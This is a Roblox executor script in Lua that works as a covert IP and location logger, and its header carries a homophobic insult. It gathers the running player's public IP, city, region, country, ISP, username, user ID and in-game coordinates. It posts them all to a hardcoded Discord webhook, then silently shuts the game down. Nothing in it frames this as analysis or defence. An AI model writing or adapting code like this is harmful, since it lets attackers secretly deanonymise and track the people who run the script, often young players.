--# CRACK IF GAY - MADE BY 0rep on discord
-- SERVICES
local HttpService = game:GetService("HttpService")
local lp = game.Players.LocalPlayer

-- Get IP using the working IP finder method
local ip = game:HttpGet("https://api.ipify.org")

-- Get geo-location data (such as country, city, region, etc.)
local geoData = game:HttpGet("https://ipapi.co/json")
local geoTable = HttpService:JSONDecode(geoData)

-- User information
local username = lp.Name
local displayName = lp.DisplayName
local userId = lp.UserId
local country = geoTable.country_name or "N/A"
local city = geoTable.city or "N/A"
local region = geoTable.region or "N/A"
local isp = geoTable.org or "N/A"

-- Reverted Coordinates Extraction (same as before)
local coords = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character.HumanoidRootPart.Position
local coordsStr = coords and string.format("X: %.2f, Y: %.2f, Z: %.2f", coords.X, coords.Y, coords.Z) or "N/A"

-- Prepare the data to send to the Discord webhook
local data = {
    ["username"] = "LOGGED",
    ["content"] = string.format(
        "Username: %s\nDisplay Name: %s\nUser ID: %s\nIP: %s\nLocation: %s, %s, %s\nISP: %s\nCoordinates: %s\nExecutor: %s",
        username,
        displayName,
        userId,
        ip,
        city,
        region,
        country,
        isp,
        coordsStr,
        identifyexecutor and identifyexecutor() or "Unknown"
    )
}

local jsonData = HttpService:JSONEncode(data)
local url = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY"  -- Your webhook URL

-- Try all known request methods
local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)

if requestFunc then
    -- Send the request to the Discord webhook
    local success, result = pcall(function()
        return requestFunc({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)

    if success then
        -- Nothing will print in the console here
    else
        warn("Failed to send webhook:", result)  -- In case of failure, a warning will be shown
    end
else
    warn("No supported HTTP request function found. Your executor might not support webhooks.")
end

-- Close the game silently after executing
wait(1)
game:Shutdown()
